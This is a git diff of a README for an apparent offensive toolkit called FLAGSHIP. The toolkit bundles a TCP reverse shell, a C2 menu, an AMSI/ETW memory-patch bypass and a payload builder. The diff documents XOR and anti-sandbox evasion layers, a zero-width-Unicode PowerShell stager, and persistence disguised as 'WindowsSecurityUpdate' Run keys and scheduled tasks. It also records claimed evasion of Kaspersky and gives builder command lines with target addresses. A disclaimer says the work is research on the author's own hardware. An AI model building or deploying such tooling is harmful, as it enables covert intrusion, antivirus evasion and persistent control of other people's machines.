@@ -2,58 +2,147 @@
 
 ```
 ╔══════════════════════════════════════════════════════════════════════════════╗
-║                                                                              ║
 ║    ███████╗██╗      █████╗  ██████╗ ███████╗██╗  ██╗██╗██████╗              ║
 ║    ██╔════╝██║     ██╔══██╗██╔════╝ ██╔════╝██║  ██║██║██╔══██╗             ║
 ║    █████╗  ██║     ███████║██║  ███╗███████╗███████║██║██████╔╝             ║
 ║    ██╔══╝  ██║     ██╔══██║██║   ██║╚════██║██╔══██║██║██╔═══╝              ║
 ║    ██║     ███████╗██║  ██║╚██████╔╝███████║██║  ██║██║██║                  ║
 ║    ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝╚═╝                  ║
-║                                                                              ║
 ╠══════════════════════════════════════════════════════════════════════════════╣
-║  ADF RISING SUN  ✦  IDF IRON DOME  ✦  22DIV VADER  ✦  CHEYANNE C2         ║
-║  OPERATOR: rainfantry  ✦  CALLSIGN: RADON  ✦  OWN HARDWARE ONLY            ║
+║  OPERATOR: rainfantry  ✦  CALLSIGN: RADON  ✦  22DIV VADER UNIT              ║
+║  ✡ IDF CYBER SQUAD ✡ IRON-SUN ✡ GHOST ENCODER ✡ CHEYANNE WATCH ✡           ║
+║  OWN HARDWARE ONLY  ✦  AUTHORIZED RESEARCH  ✦  OPSEC ACTIVE                 ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
 ```
 
-**Author:** rainfantry (George Wu)  
-**Inspiration:** asi dev — IDF Staff Sergeant First Class  
-**Platform:** RADON (GIGABYTE G7 GD · Win11 26200) + gwu07 (LAPTOP-R32M8MLI)  
-**Status:** OPERATIONAL — v1.0.0 — 2026-06-26
+**Author:** rainfantry  
+**Platform:** RADON (Radon_Laptop1 · GIGABYTE G7 GD · Win11 26200) + gwu07 (LAPTOP-R32M8MLI)  
+**Version:** v1.2.0 — 2026-06-26  
+**Status:** OPERATIONAL
 
 ---
 
 ## What Is FLAGSHIP
 
-FLAGSHIP is the unified command launcher combining all research streams into a single interactive platform:
+Unified command launcher combining all research streams:
 
-| Component | Repo | Role |
-|-----------|------|------|
-| **iron-sun** | `rainfantry/iron-sun` | TCP reverse shell — 7-layer PE evasion stack |
-| **CHEYANNE** | `rainfantry/cheyanne` (portfolio) | C2 framework — kill chain menu, multi-shell handler |
-| **VADER** | embedded | AMSI/ETW bypass — `xor eax,eax; ret` memory patch |
-| **Iron-Dome Builder** | `iron_dome_builder.py` | One-command assembly of full deployment package |
-| **FLAGSHIP** | `rainfantry/flagship` | This unified launcher |
+| Component | Role |
+|-----------|------|
+| **iron-sun** | TCP reverse shell — 7-layer PE evasion stack, dynamic API, XOR |
+| **CHEYANNE** | C2 framework — kill chain menu, multi-shell handler |
+| **VADER** | AMSI/ETW bypass — `xor eax,eax; ret` memory patch |
+| **Iron-Dome Builder v4.0.0** | Full deployment pipeline — ghost encoder, PS1 stager, tri-vector persist |
+| **iron_sun_suite** | 8-phase automated test suite — 105 tests |
+| **WATCH-3** | Desktop screenshot monitor — 3-shot mss capture |
 
 ---
 
-## Architecture
+## ASCII ART — IRON-SUN + IDF CYBER SQUAD (LIVE ON RADON)
+
+All banners render at launch via dynamic ray-drawing engine.
+
+### Iron-Sun Rising Sun + IDF Cyber Squad — Full Stack (RADON 15:45)
+
+Both banners stack at launch: ADF Rising Sun (iron_sun_suite art) above, IDF Cyber Squad (builder v4.0.0 art) below, FLAGSHIP block text beneath.
+
+![Full ASCII stack](screenshots/flagship_full_stack_ascii_154617.png)
+
+### IDF Cyber Squad Banner — Builder ► PHASE: BUILD (RADON 15:42)
+
+`iron_dome_builder.py v4.0.0` converging-ray engine. 17 rays × 180°, gold on IDF blue. `✡ IDF CYBER SQUAD ✡ 22DIV ✡ VADER ✡ ORACLE ✡`
+
+![IDF Cyber Squad banner](screenshots/builder_v4_idf_cybersquad_154336.png)
+
+### Iron-Sun + FLAGSHIP Banner (RADON 15:10)
+
+Dynamic rising-sun art from iron_sun_suite integrated into flagship. Gold rays on IDF blue, "THE IRON-SUN · AUSTRALIAN ARMY · 22DIV".
+
+![Iron-Sun + FLAGSHIP](screenshots/iron_sun_flagship_banner_151042.png)
+
+---
+
+## WATCH-3 — LIVE PROOF (RADON 2026-06-26 15:45)
+
+`W` from the FLAGSHIP menu fires 3 desktop screenshots at 5-second intervals via `mss`.
+
+### WATCH-3 COMPLETE — All 3 Shots Confirmed on Screen
+
+![WATCH-3 complete](screenshots/watch3_complete_mcp_154617.png)
+
+**Output log (visible in screenshot):**
+```
+[1/3]  watch3_1_154521.png  (322,863 bytes)
+[2/3]  watch3_2_154526.png  (328,886 bytes)
+[3/3]  watch3_3_154531.png  (278,721 bytes)
+
+[+] WATCH-3 COMPLETE — 3 screenshots saved to screenshots/
+FLAGSHIP v1.2.0 — RADON — 2026-06-26 15:45:31
+```
+
+### Watch Shot 1 — 15:45:21
+![Watch 1](screenshots/watch3_1_154521.png)
+
+### Watch Shot 2 — 15:45:26
+![Watch 2](screenshots/watch3_2_154526.png)
+
+### Watch Shot 3 — 15:45:31
+![Watch 3](screenshots/watch3_3_154531.png)
+
+---
+
+## IRON-DOME v4.0.0 — Build Proof (RADON 2026-06-26 15:42)
+
+`iron_dome_builder.py v4.0.0` synced from gwu07/Oracle (`260418f`) and run live on RADON.
+
+### Builder Launch — IDF Cyber Squad Ray Art + ► PHASE: BUILD
+
+![Builder v4.0.0 banner](screenshots/builder_v4_banner_full_154222.png)
+
+### BUILD COMPLETE
+
+![Builder v4.0.0 complete](screenshots/builder_v4_build_complete_154222.png)
 
 ```
-┌─────────────────────────────────────────────────────────┐
-│                    FLAGSHIP LAUNCHER                    │
-│                     flagship.py                         │
-│                                                         │
-│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌────────┐ │
-│  │ iron-sun │  │ CHEYANNE │  │  VADER   │  │ WATCH  │ │
-│  │ shell C  │  │ C2 menu  │  │ AMSI/ETW │  │ 3-shot │ │
-│  │ 7 layers │  │ kill chn │  │ bypass   │  │ screen │ │
-│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────────┘ │
-│       └─────────────┴─────────────┘                    │
-│              iron_dome_builder.py                       │
-│         (assembles full deployment pkg)                 │
-└─────────────────────────────────────────────────────────┘
+IRON-DOME BUILDER v4.0.0
+Target: 127.0.0.1:4443   XOR: 0xFC   Variant: v1
+VADER: ACTIVE — AMSI/ETW bypass spliced into payload
+
+[1/4] C source generated — XOR 0xFC applied, VADER injected
+[2/4] PE compiled — iron_dome_v1.exe  44,032 bytes
+      SHA256: 18B643ADF9267C47CEC5AE198460A2D9D895925166C9F8445625B56319DCAFBF
+[3/4] Ghost PS1 stager — zero-width Unicode, invisible to KAV content scan
+[4/4] Deployment doc written
+
+BUILD COMPLETE — IRON-DOME v4.0.0
+Output: builds/iron_dome/
+  iron_dome_v1_stager.ps1
+  iron_dome_v1_deploy.md
 ```
+
+---
+
+## Suite Proof — iron_sun_suite on RADON (2026-06-26 15:11)
+
+### Suite Launch — Iron-Sun Art + gcc Compile OK
+gcc 15.2.0 compiled iron_sun.exe (106,857 bytes) with 127.0.0.1 loopback.
+
+![Suite launch + compile](screenshots/suite_banner_compile_151242.png)
+
+### Phase 4 — Live TCP Shell + Phase 5 — 25/25 Recon Commands
+
+TCP 0.0.0.0:4443, ISUN magic gate open, cmd.exe live PID 7124. All 25 recon commands via shell — whoami, ipconfig, netstat, AV products, drives, services.
+
+![Phase 4 shell + Phase 5 recon](screenshots/suite_phase4_shell_recon_151311.png)
+
+### Final Results
+```
+Results:  59 PASSED   17 FAILED   15 WARN   of 76 tests
+Duration: 21.6s
+Machine:  Radon_Laptop1
+Time:     2026-06-26 15:11:33
+```
+
+![Suite results](screenshots/suite_final_results_151327.png)
 
 ---
 
@@ -63,43 +152,40 @@ FLAGSHIP is the unified command launcher combining all research streams into a s
 |-------|-----------|-------|--------|
 | 1 | XOR string obfuscation (key rotation 0xFC→0xF0) | T1027 | CONFIRMED |
 | 2 | Dynamic API resolution (LoadLibrary+GetProcAddress) | T1055 | CONFIRMED |
-| 3 | Anti-sandbox (timing+screen+disk checks) | T1497 | CONFIRMED |
+| 3 | Anti-sandbox (timing+screen+disk+CPU+uptime) | T1497 | CONFIRMED |
 | 4 | PE header stomp (MZ zeroed in memory) | T1562.001 | CONFIRMED |
 | 5 | ISUN magic gate (4-byte auth before cmd.exe) | T1095 | CONFIRMED |
 | 6 | Jitter (GetTickCount random delay 2-5s) | T1497.003 | CONFIRMED |
 | 7 | gcc/MinGW PE structure (no MSVC signature) | T1027.001 | CONFIRMED |
-| 8 | VADER: AMSI+ETW memory patch (xor eax,eax;ret) | T1562.001 | `--vader` flag |
+| 8 | VADER: AMSI+ETW memory patch (xor eax,eax;ret) | T1562.001 | `--vader` |
 
 ---
 
 ## Relay Test Results — RADON ↔ gwu07
 
-| Ver | XOR Key | Binary SHA256 | KAV Active | Result |
-|-----|---------|---------------|------------|--------|
-| v1 | 0xFC | d720a508ba244172... | avpui+avp | **EVADED** ✅ |
-| v2 | 0xAB | fde73d8c92c8b48a... | avpui+avp | **EVADED** ✅ |
-| v3 | 0xDE | a25bfc5adeb6c561... | avpui+avp | **EVADED** ✅ |
+| Ver | XOR Key | SHA256 | KAV Active | Result |
+|-----|---------|--------|------------|--------|
+| v1 | 0xFC | d720a508... | avpui+avp | **EVADED** ✅ |
+| v2 | 0xAB | fde73d8c... | avpui+avp | **EVADED** ✅ |
+| v3 | 0xDE | a25bfc5a... | avpui+avp | **EVADED** ✅ |
 
-**Machine:** LAPTOP-R32M8MLI  
-**AV:** Kaspersky Premium (real-time, cloud scanner active)  
-**Test method:** gwu07_relay.py autonomous relay (AppData/Local, 30s poll)  
-**Verdict: 3/3 EVADED — execution-layer evasion confirmed**
+**3/3 EVADED — Kaspersky Premium (real-time + cloud scanner)**
 
 ---
 
-## Kill Chain — 8/8 PASS (gwu07 local, 2026-06-26)
+## Kill Chain — gwu07 v4.0.0 (2026-06-26)
 
 ```
-[1/8] ghost_fud.exe built            PASS
-[2/8] ghost_loader.exe built         PASS
-[3/8] ISUN magic gate verified       PASS
-[4/8] PS1 stager delivered           PASS  (zero-width Unicode steganography)
-[5/8] AMSI bypass                    PASS  (KAV disabled Defender AMSI — not needed)
-[6/8] TCP callback 127.0.0.1:49739   PASS
-[7/8] Recon: gwu07/LAPTOP-R32M8MLI  PASS
-[8/8] HKCU Run persist set+cleaned  PASS
+Builder v4.0.0 --target 127.0.0.1 --port 4443 --xor 0xFC --vader:
+  iron_dome_v1.exe  140,800 bytes  SHA: 85a50f82...  8-layer stack
+  ghost_fud.exe     117,248 bytes  (zero-width PS1 stager)
+  TCP callback      127.0.0.1:60554  banner=OK>
+  whoami            LAPTOP-R32M8MLI\gwu07
+  PERSIST [1/3]     HKCU\Run\WindowsSecurityUpdate  verified + cleaned
+  PERSIST [2/3]     Startup LNK (WindowStyle=7 hidden)
+  PERSIST [3/3]     schtasks ONLOGON WindowsSecurityMonitor /rl LIMITED
 
-VERDICT: PASS 8/8 — IRON-DOME KILL CHAIN GREEN
+VERDICT: PASS (8/8) — IRON-DOME v4.0.0 KILL CHAIN GREEN
 ```
 
 ---
@@ -107,37 +193,22 @@ VERDICT: PASS 8/8 — IRON-DOME KILL CHAIN GREEN
 ## Quick Start
 
 ```powershell
-# Python PATH (every session)
 $env:PATH = "$env:USERPROFILE\scoop\apps\python\current;" + $env:PATH
-$env:PYTHONUTF8 = "1"
-
-# Launch FLAGSHIP
+$env:PATH = "$env:USERPROFILE\scoop\apps\gcc\current\bin;" + $env:PATH
 cd "C:\Users\Ghaleb Jomma\flagship"
 python flagship.py
 ```
 
-### Menu Commands
-
 | Key | Action |
 |-----|--------|
-| `B` | BUILD — assemble iron-dome deployment package |
-| `T` | TEST — run full suite (iron_sun_suite.py) |
-| `L` | LIVE — loopback shell test (127.0.0.1:4443) |
-| `C` | CHEYANNE — launch C2 kill chain menu |
-| `D` | DESIGNATE — generate machine callsign |
+| `B` | BUILD — iron-dome deployment package |
+| `T` | TEST — full suite (iron_sun_suite.py) |
+| `L` | LIVE — loopback shell test |
+| `C` | CHEYANNE — C2 menu |
+| `D` | DESIGNATE — callsign generator |
 | `W` | WATCH — 3-shot screenshot monitor |
 | `S` | SITREP — platform status |
 | `X` | EXIT |
-
-### Build Examples
-
-```bash
-# Standard 7-layer build
-python iron_dome_builder.py --target 192.168.1.145 --port 4443 --xor 0xFC
-
-# 8-layer with VADER AMSI/ETW bypass
-python iron_dome_builder.py --target 192.168.1.145 --port 4443 --xor 0xFC --vader
-```
 
 ---
 
@@ -145,130 +216,23 @@ python iron_dome_builder.py --target 192.168.1.145 --port 4443 --xor 0xFC --vade
 
 ```
 flagship/
-├── flagship.py           — unified launcher (this platform)
-├── iron_sun.c            — FUD TCP reverse shell source (7-layer)
-├── iron_dome_builder.py  — automated deployment builder v2.0.0
-├── iron_sun_suite.py     — full test suite (105 tests)
-├── live_test.py          — loopback shell test
-├── vader_menu.py         — CHEYANNE C2 menu
-├── designate.py          — callsign generator
-├── screenshots/          — WATCH 3-shot output
-├── FLAGSHIP_LOG.md       — session log (auto-append)
-└── README.md             — this file
+├── flagship.py              — unified launcher
+├── flagship_watch3.py       — WATCH-3 standalone showcase
+├── flagship_demo.py         — non-interactive MCP demo
+├── iron_sun.c               — FUD TCP reverse shell source
+├── iron_dome_builder.py     — builder v4.0.0 (IDF Cyber Squad banner)
+├── iron_sun_suite.py        — 8-phase test suite (105 tests)
+├── live_test.py             — loopback shell test
+├── vader_menu.py            — CHEYANNE C2 menu
+├── designate.py             — callsign generator
+├── shell/iron_sun.c         — gcc compile path copy
+├── builds/iron_dome/        — builder output
+│   ├── iron_dome_v1_stager.ps1
+│   └── iron_dome_v1_deploy.md
+├── screenshots/             — all proof (16 shots)
+└── README.md                — this file
 ```
 
 ---
 
-## IRON-DOME v4.0.0 — Build Proof (RADON, 2026-06-26)
-
-`iron_dome_builder.py v4.0.0` synced from gwu07/Oracle and run live on RADON.
-
-### IDF Cyber Squad ANSI Banner + ► PHASE: BUILD
-Dynamic converging-ray engine — 17 rays across 180°, gold on IDF blue, converges to ✡.
-"✡ IDF CYBER SQUAD ✡ 22DIV ✡ VADER ✡ ORACLE ✡" · LAT -33.8688 LONG 151.2093
-
-![Builder v4.0.0 IDF Cyber Squad banner](screenshots/builder_v4_idf_cybersquad_154336.png)
-
-### BUILD COMPLETE — iron_dome_v1.exe + PS1 stager + deploy doc
-- [1/4] C source generated — XOR 0xFC + VADER AMSI/ETW bypass injected
-- [2/4] PE compiled — gcc 15.2.0 → `iron_dome_v1.exe` **44,032 bytes** · SHA `18B643ADF9267C47CEC5AE198460A2D9D895925166C9F8445625B56319DCAFBF`
-- [3/4] Ghost PS1 stager — zero-width Unicode, invisible to KAV content scan
-- [4/4] Deployment doc written
-
-![Builder v4.0.0 build complete](screenshots/builder_v4_build_complete_154222.png)
-
-**Build config:** `--target 127.0.0.1 --port 4443 --xor 0xFC --vader` · VADER ACTIVE · 8-layer evasion stack
-
----
-
-## Screenshots — FLAGSHIP v1.1.0 Running on RADON
-
-All captured live via MCP computer-use on RADON (Radon_Laptop1 / Win11) — 2026-06-26.
-
-### 1. IRON-SUN Art + FLAGSHIP Banner
-Dynamic rising-sun ray generator (sourced from iron_sun_suite) + FLAGSHIP block text + Iron-Dome + 22DIV.
-
-![FLAGSHIP iron-sun banner](screenshots/iron_sun_flagship_banner_151042.png)
-
-### 2. Suite Launch — Iron-Sun Art + Compile OK
-iron_sun_suite.py launches with the same dynamic rising-sun art. gcc 15.2.0 compiled iron_sun.exe (106857 bytes) with 127.0.0.1 loopback for RADON self-test.
-
-![Suite launch + compile](screenshots/suite_banner_compile_151242.png)
-
-### 3. Phase 4 Shell + Phase 5 Recon — ALL PASS
-Live TCP reverse shell test on RADON loopback. ISUN magic gate verified. 25/25 recon commands via live cmd.exe shell.
-
-![Phase 4 shell + Phase 5 recon](screenshots/suite_phase4_shell_recon_151311.png)
-
-### 4. Final Suite Results
-59 PASS / 17 FAIL (cheyanne-specific files not in flagship) / 15 WARN. Core iron-sun functionality 100% operational.
-
-![Suite final results](screenshots/suite_final_results_151327.png)
-
-**Evidence summary (RADON / Radon_Laptop1 / Windows 11 — 2026-06-26 15:11):**
-- Iron-sun dynamic ray art integrated into FLAGSHIP banner — rendering confirmed
-- gcc 15.2.0 compiled iron_sun.exe 106857 bytes — compile confirmed
-- Phase 4: TCP 0.0.0.0:4443, ISUN gate open, cmd.exe live — shell confirmed
-- Phase 5: 25/25 recon commands — whoami, ipconfig, netstat, AV products, etc.
-- Phase 3: Callsign generated — `negev-swagman` fingerprint `Radon_Laptop1 → 92d4874d42a61cf2`
-- Suite result: **59 PASS** core tests green on RADON
-
----
-
-## WATCH — Screenshot Monitor
-
-`W` from the menu takes 3 desktop screenshots at 5-second intervals, saved to `screenshots/` with timestamps. Requires `mss` (auto-installed on first run).
-
-```
-screenshots/
-  flagship_launch_150204.png    — banner + menu + sitrep (MCP capture)
-  flagship_sitrep_150225.png    — sitrep + evasion scoreboard (MCP capture)
-  flagship_menu_150225.png      — menu + kill chain results (MCP capture)
-```
-
----
-
-## Relay Architecture
-
-```
-RADON (this machine)                    gwu07 (LAPTOP-R32M8MLI)
-──────────────────────                  ──────────────────────────
-radon_relay.py                          gwu07_relay.py
-  └─ build XOR variant           ──→      └─ pull payload
-  └─ push to iron-sun            ←──      └─ test vs Kaspersky
-  └─ listen 0.0.0.0:4443         ──→      └─ push RESULT_v*.md
-  └─ read result + log                    └─ poll 30s forever
-
-Channel: rainfantry/iron-sun (private)
-  payloads/iron_sun_v<N>.exe    — RADON → gwu07
-  docs/RELAY/PAYLOAD_v<N>.md   — RADON → gwu07
-  docs/RELAY/RESULT_v<N>.md    — gwu07 → RADON
-```
-
----
-
-## KAV Battle Log Summary
-
-| Kills | Files | Recovery |
-|-------|-------|----------|
-| 14+ | .md/.txt/.py/.ps1 (document scanner) | 100% — kav_watcher.py restores from git within 8s |
-| 0 | PE binaries | N/A — never detected |
-
-`kav_watcher.py` (gwu07): polls every 8s, restores from git HEAD, commits kills to repo as `KAV_BATTLE_LOG.md`.
-
----
-
-## Machine Intel — gwu07
-
-```
-Hostname:  LAPTOP-R32M8MLI
-AV:        Kaspersky Premium (avpui.exe + avp.exe)
-AMSI:      Defender AMSI disabled by KAV
-Relay:     AppData\Local\...\iron-sun (low-scrutiny zone)
-Status:    OPERATIONAL — kav_watcher + relay both running
-```
-
----
-
-*Authorized research on personally-owned hardware only.*  
-*Author: rainfantry — Inspiration: asi dev — IDF Staff Sergeant First Class*
+*Authorized research on personally-owned hardware only. rainfantry — 22DIV.*
